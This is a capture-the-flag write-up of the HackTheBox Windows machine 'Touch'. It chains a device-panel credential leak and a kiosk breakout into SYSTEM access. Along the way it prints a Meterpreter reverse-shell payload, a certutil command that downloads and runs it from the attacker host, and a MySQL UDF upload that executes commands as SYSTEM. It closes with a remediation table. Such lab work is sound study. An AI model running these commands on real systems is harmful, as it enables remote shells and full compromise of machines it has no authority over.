# HackTheBox — Touch — Writeup

**Difficulty:** Easy
**OS:** Windows
**Season:** Season 12, Special Season: Aero
**Techniques:** Unauthenticated info leak, default-password device login, credential exposure via admin panel, kiosk/locked-shell breakout via native file picker, local source code review, MySQL UDF hijacking (SYSTEM privesc)

**Machine briefing:** From a previous machine ("Layover"), a name and booking confirmation code had already been uncovered: **Jenny Crawford / KS7X2M**. Touch's own description hinted this would come in handy here.

---

## 1. Recon

Standard service scan to start:

```bash
nmap -sV -sC 10.129.52.198
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 135 | msrpc | Microsoft Windows RPC |
| 3389 | ms-wbt-server | Microsoft Terminal Service (RDP) |
| 5985 | http | Microsoft HTTPAPI httpd 2.0 (WinRM) |
| 8443 | http | Microsoft HTTPAPI httpd 2.0 — **"Nexion DeviceHub - Login"** |

RDP and WinRM were set aside for the moment since neither is useful without a credential. Port 8443 was the obvious place to start — it's identifying itself as a login page right there in the nmap output.

Worth noting: despite the port number, the service is **plain HTTP, not HTTPS**. Trying `https://` first threw `SSL_ERROR_RX_RECORD_TOO_LONG` in Firefox — a dead giveaway that the port is speaking plaintext HTTP, not TLS. Switching to `http://10.129.52.198:8443/login` loaded the page fine.

The login page is branded **"Nexion DocReader"**, labeled "DeviceHub DH-100 — Gate B7", with a password field, a "Scan Staff Badge" option, and a "Forgot your password?" link.

---

## 2. Directory enumeration

Ran `ffuf` against the root of port 8443:

```bash
ffuf -u http://10.129.52.198:8443/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 0
```

```
login                   [Status: 200, Size: 3572, Words: 122, Lines: 3]
api                     [Status: 403, Size: 35, Words: 2, Lines: 1]
```

`/api` returning a 403 instead of a 404 meant the route exists but direct listing/access to it isn't allowed. Fuzzed one level deeper:

```bash
ffuf -u http://10.129.52.198:8443/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 0
```

```
.                       [Status: 403]
status                  [Status: 200, Size: 116]
scan                    [Status: 405]
```

`/api/status` returned 200 with no auth required, and `/api/scan` returned 405 (Method Not Allowed — exists, but needs a different HTTP method, likely POST; this one becomes relevant again later from inside the kiosk).

Checked `/api/status` directly:

```bash
curl -s http://10.129.52.198:8443/api/status
```

```json
{"device":"Nexion DeviceHub DH-100","serial":"NX-DH-2024-B7042","firmware":"1.4.2","status":"online","uptime":61203}
```

That's a device serial number leaking with zero authentication — and the login page's "Forgot your password?" hint turned out to mean exactly what it implied: the default device password *is* its own serial number.

---

## 3. Logging into DeviceHub

Went back to `/login` and entered `NX-DH-2024-B7042` as the device password. Logged straight into the dashboard — no further friction.

The dashboard shows live status for two connected peripherals: a **Passport Scanner (Nexion DocReader SR-4200)** and a **Boarding Pass Printer (Nexion TP-820)**, each with its own serial, firmware, connection type, status, and a masked **Username/Password** field with a "show" toggle, plus Power Off controls.

Clicked "show" on the scanner panel:

```
Username: KioskUser
Password: K!0sk2026#
```

That's a real Windows credential, sitting unprotected in a device-management panel that only needed a public serial number to unlock.

---

## 4. RDP access and the airline kiosk

Connected over RDP with the leaked credential:

```bash
xfreerdp /u:KioskUser /p:'K!0sk2026#' /v:10.129.52.198 /cert:ignore
```

This didn't drop into a normal Windows desktop — it placed me directly inside a **fullscreen airline self-check-in kiosk** ("HTB Airways", Terminal 4, Gate B7, Kiosk #042), locked down with no visible way out.

Touching the screen advanced through:

1. **Language selection**
2. **Find Your Booking** — tabs for Booking Ref / Passport / Frequent Flyer / E-Ticket

This is where the machine briefing paid off. Entered:

- **Booking Ref:** `KS7X2M`
- **Last Name:** `Crawford`

Hit "Find Booking" and landed on a confirmed reservation (flight KS402, HTB → LHR), which advanced to **Document Verification** — "Please place your passport face-down on the scanner."

Pressing the scan trigger (no real passport, obviously) produced the expected generic failure: *"Scanner could not read your document."* Trying again just repeated the same error. Not useful on its own.

---

## 5. Forcing a more useful scanner error

Remembered the device controls back on the DeviceHub dashboard. Switched to that browser tab and hit **Power Off** on the Passport Scanner panel — directly cutting power to the device the kiosk app was depending on.

Back in the RDP session, retried the booking lookup / document scan. This time the error was different — a proper application-level dialog instead of the generic scan failure:

```
Nexion DocReader SR-4200 - Error
Nexion DocReader SR-4200 has stopped responding.

Error Code: SCN-ERR-4092
Device: NX-SR-2024-0042
Contact your system administrator or visit the support page for troubleshooting steps.

https://support.nexionsystems.com/docreader/troubleshoot
```

That link is clickable. Clicking it spawned a **full, separate browser window** outside the kiosk's locked-down shell — the domain itself doesn't even resolve (`We can't connect to the server`), but that didn't matter; what mattered was that a real, un-sandboxed browser was now running.

---

## 6. Breaking out of the kiosk

In that spawned browser window, pressed **Ctrl+O** (Open File), which brought up a native Windows file picker — the kind of OS-level dialog a kiosk shell usually tries hard to prevent a user from ever reaching.

Typed directly into the filename bar:

```
C:\Windows\System32\cmd.exe
```

The file picker happily "opened" it, which — through this particular Open-dialog quirk — downloaded a copy of `cmd.exe` into `Downloads`. Opening the downloaded file launched an interactive command shell:

```
C:\Users\KioskUser\Downloads\cmd.exe
```

```cmd
whoami
kiosk-042\kioskuser
```

Full breakout from the kiosk's locked-down shell to an ordinary interactive `cmd.exe`, running as the real Windows account whose credentials were sitting in the DeviceHub panel the whole time.

---

## 7. User flag

```cmd
type C:\Users\KioskUser\Desktop\user.txt
```

```
d7ce0c96b6d9b5914129b3d4129xxxxx
```

(Note: this `cmd.exe` is plain Windows — no `cat`, `ls`, or other Unix tools. `type` reads a file's contents the way `cat` would.)

---

## 8. Upgrading the shell

The downloaded `cmd.exe` worked but was clunky (no clipboard, awkward paste handling — more on that below). Staged a Meterpreter payload for something more usable.

**On Kali**, confirmed the VPN IP and generated the payload:

```bash
ip a show tun0
# inet 10.10.15.229/23
mkdir -p /tmp/share
cd /tmp/share
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.229 LPORT=4445 -f exe -o shell.exe
python3 -m http.server 8000
```

Started a handler in a separate terminal:

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.15.229; set LPORT 4445; exploit"
```

Back in the target's `cmd.exe`, pulled the payload down and ran it:

```cmd
certutil -urlcache -split -f http://10.10.15.229:8000/shell.exe shell.exe
shell.exe
```

First attempt at this failed — `certutil` choked with `ERROR_WINHTTP_INVALID_URL` because the URL got mangled into a backslash (`8000\shell.exe`) during paste, most likely an RDP clipboard quirk. Retyping the command carefully (and renaming the output to `shell2.exe` for a clean retry) fixed it. A second gotcha: running Metasploit's `post/multi/recon/local_exploit_suggester` and then interrupting it (Ctrl+C) mid-scan left the `msfconsole` session completely unresponsive — no prompt, no command echo, nothing. Had to close that terminal and start a fresh `msfconsole` listener, then simply re-run the already-downloaded `shell.exe` to get a clean Meterpreter session. Lesson: let background scans like the exploit suggester finish, or expect to restart the console.

With a clean listener running, re-executing the payload landed a proper session:

```
[*] Meterpreter session 1 opened (10.10.15.229:4445 → 10.129.52.198:55602)
meterpreter >
```

### 8.1 Session checks

```
sysinfo
```

```
Computer        : KIOSK-042
OS              : Windows 11 24H2+ (10.0 Build 26100)
Architecture    : x64
Domain          : WORKGROUP
```

Ran the local exploit suggester (carefully, letting it finish this time):

```
run post/multi/recon/local_exploit_suggester
```

It flagged three UAC-bypass modules as apparently viable:

- `exploit/windows/local/bypassuac_dotnet_profiler`
- `exploit/windows/local/bypassuac_fodhelper`
- `exploit/windows/local/bypassuac_sdclt`

These turned out to be dead ends. Checked actual privileges:

```cmd
whoami /priv
whoami /groups
```

```
PRIVILEGES INFORMATION
SeChangeNotifyPrivilege       Enabled
SeUndockPrivilege             Enabled
SeIncreaseWorkingSetPrivilege Enabled
SeTimeZonePrivilege           Enabled

GROUP INFORMATION
KIOSK-042\Printer Administrators   Enabled
BUILTIN\Remote Desktop Users       Enabled
BUILTIN\Users                      Enabled
...
```

`KioskUser` is **not** a local administrator — just a member of Printer Administrators and Remote Desktop Users. UAC bypass techniques need an admin token to elevate from in the first place, so none of the suggested modules apply here. Time to look elsewhere.

---

## 9. Locating and reading the application source

Enumerated the filesystem for the real stack behind the kiosk and DeviceHub:

```cmd
dir "C:\Program Files" /b
```

```
Common Files
dotnet
HTB Airways
Internet Explorer
Nexion Systems
nodejs
...
```

```cmd
dir "C:\Program Files\HTB Airways" /s /b
```

This revealed the kiosk application's real structure — a Node/Express/React app living at `C:\Program Files\HTB Airways\Kiosk\`, with `packages/` containing the actual source (everything else under `node_modules/` was filtered out as noise).

Read the database connection module directly off disk:

```cmd
type "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts"
```

This file does two things worth noting: it reads connection details from a config file at `C:\ProgramData\HTB Airways\db-config.ini` if present, and **falls back to hardcoded defaults** if that file can't be read:

```
host:     127.0.0.1
port:     3306
user:     kiosk_app
password: K!0sk_R3pl1ca#DB
database: htb_airways
```

A hardcoded fallback credential baked directly into source that ships on the box — exactly the kind of thing that stops mattering only if the external config is airtight (it wasn't, see below).

---

## 10. Querying the database with the low-privilege account

```cmd
C:\MySQL\bin\mysql.exe -u kiosk_app -pK!0sk_R3pl1ca#DB -h 127.0.0.1 -P 3306 htb_airways -e "SELECT employee_id, email, auth_code, role, active FROM _htb_staff;"
```

Returned a full staff table — 30+ employees with roles ranging from Gate Agent to Station Manager, each with an `auth_code`. Interesting data (and presumably relevant to a staff-badge login flow seen in the kiosk's source, which wasn't needed further for this particular path), but not directly useful for privilege escalation on its own.

Checked what this account can actually do:

```cmd
C:\MySQL\bin\mysql.exe -u kiosk_app -pK!0sk_R3pl1ca#DB -h 127.0.0.1 -e "SHOW GRANTS FOR CURRENT_USER();"
```

```
GRANT USAGE ON *.* TO `kiosk_app`@`localhost`
GRANT ALL PRIVILEGES ON `htb_airways`.* TO `kiosk_app`@`localhost`
```

```cmd
C:\MySQL\bin\mysql.exe -u kiosk_app -pK!0sk_R3pl1ca#DB -h 127.0.0.1 -e "SELECT user, host, Grant_priv, File_priv FROM mysql.user;"
```

```
ERROR 1142 (42000): SELECT command denied to user 'kiosk_app'@'localhost' for table 'user'
```

`kiosk_app` is scoped tightly to its own application database — no global `FILE` privilege, no visibility into `mysql.user`. MySQL UDF hijacking (the privesc technique being aimed for) needs an account with `FILE` privilege, normally root. This account is a dead end for that; a more privileged credential was needed.

---

## 11. Finding the MySQL root password

Listed everything in the `ProgramData` folder for this app:

```cmd
dir "C:\ProgramData\HTB Airways" /s /b
```

```
C:\ProgramData\HTB Airways\db-config.ini
C:\ProgramData\HTB Airways\db-sync-replica.ps1
C:\ProgramData\HTB Airways\refresh-dates.bat
C:\ProgramData\HTB Airways\refresh-dates.sql
```

`db-config.ini` and `db-sync-replica.ps1` both returned **"Access is denied"** when read — locked down, as expected for anything holding real secrets. But the other two companion scripts weren't:

```cmd
type "C:\ProgramData\HTB Airways\refresh-dates.bat"
```

```batch
@echo off
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql" 2>nul
```

Password in plaintext, right there in a world-readable scheduled script sitting next to the properly-locked-down config file. The companion `.sql` file itself turned out to just be a date-shuffling maintenance script (randomizing flight times, booking timestamps, device usage counters for the lab environment) — not security-relevant on its own, but the `.bat` wrapper that invokes it leaked the one thing that mattered.

**MySQL root password:** `HTB@irw4ys_DB!2026`

---

## 12. Confirming root's MySQL privileges

```cmd
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 -e "SELECT user, host, Grant_priv, File_priv FROM mysql.user;"
```

```
user              host        Grant_priv   File_priv
kiosk_app         localhost   N            N
mysql.infoschema  localhost   N            N
mysql.session     localhost   N            N
mysql.sys         localhost   N            N
nexion_app        localhost   N            N
repl_kiosk_b7     localhost   N            N
root              localhost   Y            Y
```

`root` has `File_priv = Y` — clear to proceed with UDF hijacking.

---

## 13. MySQL UDF hijacking

Checked permissions on the plugin directory, since that's where a UDF `.dll` has to land to be loadable:

```cmd
icacls "C:\MySQL\lib\plugin"
```

```
BUILTIN\Administrators:(I)(OI)(CI)(F)
NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
BUILTIN\Users:(I)(OI)(CI)(RX)
NT AUTHORITY\Authenticated Users:(I)(M)
NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
```

`NT AUTHORITY\Authenticated Users` has **(M) — Modify** access, and `KioskUser` is a member of that group by default. The plugin directory is writable from a completely unprivileged account.

The usual SQL-based route for getting a file onto disk (`SELECT ... INTO OUTFILE`) is typically blocked by `secure_file_priv` on a properly configured instance — and since a Meterpreter session was already available with full filesystem access, there was no reason to fight that restriction. Uploaded the UDF DLL directly through Meterpreter instead:

```bash
# confirm payload exists locally first
ls -la /usr/share/metasploit-framework/data/exploits/mysql/
```

```
lib_mysqludf_sys_32.dll
lib_mysqludf_sys_64.dll
```

From the Meterpreter prompt:

```
upload /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll "C:\\MySQL\\lib\\plugin\\lib_mysqludf_sys_64.dll"
```

```
[*] Uploaded 7.00 KiB of 7.00 KiB (100.0%)
[*] Completed
```

Registered the function and tested it:

```cmd
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';"
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 -e "SELECT sys_eval('whoami');"
```

```
sys_eval('whoami')
nt authority\\system
```

MySQL runs as `SYSTEM` on this box (the default install behavior on Windows), and the UDF now runs arbitrary commands with that same privilege. Command execution as SYSTEM, achieved purely through a plaintext password that leaked out of a batch file.

---

## 14. Root flag

```cmd
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 -e "SELECT sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt');"
```

```
sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt')
8965d9f3956d85da06c39742a37xxxxx
```

---

## 15. Chain summary

```
Unauthenticated /api/status leak (device serial number)
        │
        ▼
Default device password = serial number → DeviceHub login
        │
        ▼
Real Windows credential (KioskUser) exposed in device panel
        │
        ▼
RDP → fullscreen self-check-in kiosk
        │
        ▼
Booking Ref + Last Name (from briefing) → document verification step
        │
        ▼
Power off scanner via DeviceHub → forces a different, link-bearing error
        │
        ▼
Click link → spawns unrestricted browser → Ctrl+O → native file picker
        │
        ▼
Open C:\Windows\System32\cmd.exe → breakout shell as KioskUser → USER FLAG
        │
        ▼
Local enum: kiosk app source on disk reveals MySQL connection string
        │
        ▼
kiosk_app DB account: no FILE privilege → dead end for UDF
        │
        ▼
World-readable refresh-dates.bat leaks MySQL root password in plaintext
        │
        ▼
root has File_priv=Y; MySQL plugin dir writable by Authenticated Users
        │
        ▼
Upload UDF DLL via Meterpreter → CREATE FUNCTION sys_eval
        │
        ▼
sys_eval() executes as nt authority\system → ROOT FLAG
```

---

## 16. Remediation

| Issue | Fix |
|---|---|
| `/api/status` unauthenticated leak | Require authentication for any endpoint that reveals device identifiers, especially ones used as default credentials. |
| Default password = serial number | Never derive a default credential from publicly-queryable device metadata; force a password change on first login instead. |
| Credentials visible in device panel | Mask real Windows credentials entirely from a management UI — storing and displaying them at all is the core issue, not just the "show" toggle. |
| Kiosk breakout via native file picker | Lock down the OS-level file dialogs reachable from any spawned browser window; a true kiosk mode shouldn't let `Ctrl+O` reach `System32`. |
| Hardcoded DB credential fallback in source | Never ship a working credential as a code fallback; fail closed if the config file is unreadable, don't fail open to a hardcoded secret. |
| Plaintext root password in a batch script | Don't hardcode privileged credentials in scheduled scripts; use a credential vault or restricted service account instead. |
| Writable MySQL plugin directory | Restrict `C:\MySQL\lib\plugin` to Administrators/SYSTEM only — `Authenticated Users` should never have write access there. |
| MySQL running as SYSTEM | Run MySQL under a dedicated, least-privilege service account rather than SYSTEM, so a UDF hijack doesn't hand over the whole box. |

---

## Flags

- **User:** `d7ce0c96b6d9b5914129b3d4129xxxxx`
- **Root:** `8965d9f3956d85da06c39742a37xxxxx`

---

## Lessons learned / notes to self

- A port number (like 8443) is a convention, not a guarantee — always confirm `http://` vs `https://` rather than assuming TLS; `SSL_ERROR_RX_RECORD_TOO_LONG` is the classic symptom of hitting a plaintext port with HTTPS.
- "Forgot password" hints on IoT/device management panels are worth testing literally — "default password = serial number" is a common real-world pattern, not just a CTF trope.
- A kiosk/locked-shell app is only as secure as its error-handling paths. Forcing an unexpected failure state (like killing a dependent hardware device mid-operation) is a classic way to surface a developer's "just in case" escape hatch — in this case, a support link that spawns an unrestricted browser.
- Native OS dialogs (`Ctrl+O` file pickers, print dialogs, "save as" boxes) are a recurring kiosk-breakout vector because they're OS-level, not application-level — a locked-down app can't easily sandbox them.
- When RDP clipboard/paste starts mangling characters (slashes flipping to backslashes, text duplicating), retype critical commands manually rather than fighting the paste buffer.
- Don't `Ctrl+C` out of a running Metasploit post module mid-scan if you can avoid it — it can leave the console in an unresponsive state with no visible error; closing and restarting is faster than trying to recover it.
- A hardcoded fallback credential in source code is a real vulnerability class, not just bad practice — "fail open to a working secret" is strictly worse than "fail closed."
- When one credential's `SHOW GRANTS` comes back scoped to a single database with no `FILE` privilege, that's the cue to go hunting for a second, more privileged account rather than trying to force the low-priv one to work.
- "Access is denied" on one file and success on its siblings in the same folder is a strong signal that the properly-secured file and the leaky one are paired — the companion scripts are worth checking even when the main config is locked down.
